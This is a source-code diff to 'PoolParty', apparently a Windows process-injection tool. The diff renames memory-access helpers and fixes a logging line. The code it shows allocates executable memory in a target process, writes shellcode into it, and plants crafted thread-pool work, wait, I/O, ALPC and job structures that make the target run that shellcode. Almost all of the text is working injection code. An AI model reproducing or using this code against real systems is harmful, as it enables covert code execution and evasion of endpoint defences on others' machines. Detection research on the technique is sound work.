@@ -33,13 +33,13 @@ WORKER_FACTORY_BASIC_INFORMATION PoolParty::GetWorkerFactoryBasicInformation() {
 }
 
 LPVOID PoolParty::AllocateShellcodeMemory() {
-	LPVOID ShellcodeAddress = AllocateMemory(*m_p_hTargetPid, m_szShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	LPVOID ShellcodeAddress = w_VirtualAllocEx(*m_p_hTargetPid, m_szShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated shellcode memory in the target process: %p") % ShellcodeAddress;
 	return ShellcodeAddress;
 }
 
 void PoolParty::WriteShellcode() {
-	WriteMemory(*m_p_hTargetPid, m_ShellcodeAddress, m_cShellcode, m_szShellcodeSize);
+	w_WriteProcessMemory(*m_p_hTargetPid, m_ShellcodeAddress, m_cShellcode, m_szShellcodeSize);
 	BOOST_LOG_TRIVIAL(info) << "Written shellcode to the target process";
 }
 
@@ -79,7 +79,7 @@ RemoteWorkItemInsertion::RemoteWorkItemInsertion(DWORD dwTargetPid, unsigned cha
 
 void RemoteWorkItemInsertion::SetupExecution() 
 {
-	auto Pool = ReadMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
+	auto Pool = w_ReadProcessMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
 	BOOST_LOG_TRIVIAL(info) << "Read target process's TP_POOL structure into the current process";
 
 	auto TaskQueueHighPriorityList = &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue;
@@ -98,15 +98,15 @@ void RemoteWorkItemInsertion::SetupExecution()
 	pWorkItem->WorkState.Exchange = 0x2;
 	BOOST_LOG_TRIVIAL(info) << "Modified the TP_WORK structure to be associated with target process's TP_POOL";
 
-	auto RemoteWorkItemAddress = (PFULL_TP_WORK)AllocateMemory(*m_p_hTargetPid, sizeof(FULL_TP_WORK), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	auto RemoteWorkItemAddress = (PFULL_TP_WORK)w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_WORK), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_WORK memory in the target process: %p") % RemoteWorkItemAddress;
-	WriteMemory(*m_p_hTargetPid, RemoteWorkItemAddress, pWorkItem, sizeof(FULL_TP_WORK));
+	w_WriteProcessMemory(*m_p_hTargetPid, RemoteWorkItemAddress, pWorkItem, sizeof(FULL_TP_WORK));
 	BOOST_LOG_TRIVIAL(info) << "Written the specially crafted TP_WORK structure to the target process";
 
 	/* To complete posting the work item we need to complete the task queue list insertion by modifying the pool side */
 	auto RemoteWorkItemTaskList = &RemoteWorkItemAddress->Task.ListEntry;
-	WriteMemory(*m_p_hTargetPid, &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList));
-	WriteMemory(*m_p_hTargetPid, &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Blink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList));
+	w_WriteProcessMemory(*m_p_hTargetPid, &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList));
+	w_WriteProcessMemory(*m_p_hTargetPid, &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Blink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList));
 	BOOST_LOG_TRIVIAL(info) << "Modified the target process's TP_POOL task queue list entry to point to the specially crafted TP_WORK";
 }
 
@@ -117,7 +117,7 @@ RemoteWaitCallbackInsertion::RemoteWaitCallbackInsertion(DWORD dwTargetPid, unsi
 
 void RemoteWaitCallbackInsertion::SetupExecution()
 {
-	auto Pool = ReadMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
+	auto Pool = w_ReadProcessMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
 	BOOST_LOG_TRIVIAL(info) << "Read target process's TP_POOL structure into the current process";
 
 	auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
@@ -126,14 +126,14 @@ void RemoteWaitCallbackInsertion::SetupExecution()
 	auto pWait = w_CreateThreadpoolWait((PTP_WAIT_CALLBACK)m_ShellcodeAddress, NULL, NULL);
 	BOOST_LOG_TRIVIAL(info) << "Created TP_WAIT structure associated with the shellcode";
 
-	auto RemoteWaitAddress = (PFULL_TP_WAIT)AllocateMemory(*m_p_hTargetPid, sizeof(FULL_TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	auto RemoteWaitAddress = (PFULL_TP_WAIT)w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_WAIT memory in the target process: %p") % RemoteWaitAddress;
-	WriteMemory(*m_p_hTargetPid, RemoteWaitAddress, pWait, sizeof(FULL_TP_WAIT));
+	w_WriteProcessMemory(*m_p_hTargetPid, RemoteWaitAddress, pWait, sizeof(FULL_TP_WAIT));
 	BOOST_LOG_TRIVIAL(info) << "Written the specially crafted TP_WAIT structure to the target process";
 
-	auto RemoteDirectAddress = (PTP_DIRECT)AllocateMemory(*m_p_hTargetPid, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	auto RemoteDirectAddress = (PTP_DIRECT)w_VirtualAllocEx(*m_p_hTargetPid, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_DIRECT memory in the target process: %p") % RemoteDirectAddress;
-	WriteMemory(*m_p_hTargetPid, RemoteDirectAddress, &pWait->Direct, sizeof(TP_DIRECT));
+	w_WriteProcessMemory(*m_p_hTargetPid, RemoteDirectAddress, &pWait->Direct, sizeof(TP_DIRECT));
 	BOOST_LOG_TRIVIAL(info) << "Written the TP_DIRECT structure to the target process";
 
 	// TODO: Fix name
@@ -155,7 +155,7 @@ RemoteIoCompletionCallbackInsertion::RemoteIoCompletionCallbackInsertion(DWORD d
 
 void RemoteIoCompletionCallbackInsertion::SetupExecution()
 {
-	auto Pool = ReadMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
+	auto Pool = w_ReadProcessMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
 	BOOST_LOG_TRIVIAL(info) << "Read target process's TP_POOL structure into the current process";
 
 	auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
@@ -173,9 +173,9 @@ void RemoteIoCompletionCallbackInsertion::SetupExecution()
 	++pTpIo->PendingIrpCount;
 	BOOST_LOG_TRIVIAL(info) << "Started async IO operation within the TP_IO";
 
-	auto RemoteIoAddress = (PFULL_TP_IO)AllocateMemory(*m_p_hTargetPid, sizeof(FULL_TP_IO), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	auto RemoteIoAddress = (PFULL_TP_IO)w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_IO), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_IO memory in the target process: %p") % RemoteIoAddress;
-	WriteMemory(*m_p_hTargetPid, RemoteIoAddress, pTpIo, sizeof(FULL_TP_IO)); 
+	w_WriteProcessMemory(*m_p_hTargetPid, RemoteIoAddress, pTpIo, sizeof(FULL_TP_IO));
 	BOOST_LOG_TRIVIAL(info) << "Written the specially crafted TP_IO structure to the target process";
 
 	IO_STATUS_BLOCK IoStatusBlock{ 0 };
@@ -205,7 +205,7 @@ RemoteAlpcCallbackInsertion::RemoteAlpcCallbackInsertion(DWORD dwTargetPid, unsi
 // TODO: Add RAII wrappers here for ALPC funcs
 void RemoteAlpcCallbackInsertion::SetupExecution() 
 {
-	auto Pool = ReadMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
+	auto Pool = w_ReadProcessMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
 	BOOST_LOG_TRIVIAL(info) << "Read target process's TP_POOL structure into the current process";
 
 	auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
@@ -239,13 +239,13 @@ void RemoteAlpcCallbackInsertion::SetupExecution()
 	AlpcPortAttributes.MaxMessageLength = 328;
 
 	auto hAlpcConnectionPort = w_NtAlpcCreatePort(&AlpcObjectAttributes, &AlpcPortAttributes);
-	BOOST_LOG_TRIVIAL(info) << boost::format("Created pool party ALPC port `%ws`: %d") % POOL_PARTY_ALPC_PORT_NAME, hAlpcConnectionPort;
+	BOOST_LOG_TRIVIAL(info) << boost::format("Created pool party ALPC port `%ws`: %d") % POOL_PARTY_ALPC_PORT_NAME % hAlpcConnectionPort;
 
 	pTpAlpc->AlpcPort = hAlpcConnectionPort;
 	
-	auto RemoteTpAlpcAddress = (PFULL_TP_ALPC)AllocateMemory(*m_p_hTargetPid, sizeof(FULL_TP_ALPC), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	auto RemoteTpAlpcAddress = (PFULL_TP_ALPC)w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_ALPC), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_ALPC memory in the target process: %p") % RemoteTpAlpcAddress;
-	WriteMemory(*m_p_hTargetPid, RemoteTpAlpcAddress, pTpAlpc, sizeof(FULL_TP_ALPC));
+	w_WriteProcessMemory(*m_p_hTargetPid, RemoteTpAlpcAddress, pTpAlpc, sizeof(FULL_TP_ALPC));
 	BOOST_LOG_TRIVIAL(info) << "Written the specially crafted TP_ALPC structure to the target process";
 
 	ALPC_PORT_ASSOCIATE_COMPLETION_PORT AlpcPortAssociateCopmletionPort = { 0 };
@@ -297,7 +297,7 @@ RemoteJobCallbackInsertion::RemoteJobCallbackInsertion(DWORD dwTargetPid, unsign
 
 void RemoteJobCallbackInsertion::SetupExecution() 
 {
-	auto Pool = ReadMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
+	auto Pool = w_ReadProcessMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
 	BOOST_LOG_TRIVIAL(info) << "Read target process's TP_POOL structure into the current process";
 
 	auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
@@ -309,9 +309,9 @@ void RemoteJobCallbackInsertion::SetupExecution()
 	auto pTpJob = w_TpAllocJobNotification(*p_hJob, m_ShellcodeAddress, NULL, NULL);
 	BOOST_LOG_TRIVIAL(info) << "Created TP_JOB structure associated with the shellcode";
 
-	auto RemoteTpJobAddress = (PFULL_TP_JOB)AllocateMemory(*m_p_hTargetPid, sizeof(FULL_TP_JOB), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	auto RemoteTpJobAddress = (PFULL_TP_JOB)w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_JOB), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_JOB memory in the target process: %p") % RemoteTpJobAddress;
-	WriteMemory(*m_p_hTargetPid, RemoteTpJobAddress, pTpJob, sizeof(FULL_TP_JOB));
+	w_WriteProcessMemory(*m_p_hTargetPid, RemoteTpJobAddress, pTpJob, sizeof(FULL_TP_JOB));
 	BOOST_LOG_TRIVIAL(info) << "Written the specially crafted TP_JOB structure to the target process";
 
 	JOBOBJECT_ASSOCIATE_COMPLETION_PORT JobAssociateCopmletionPort = { 0 };
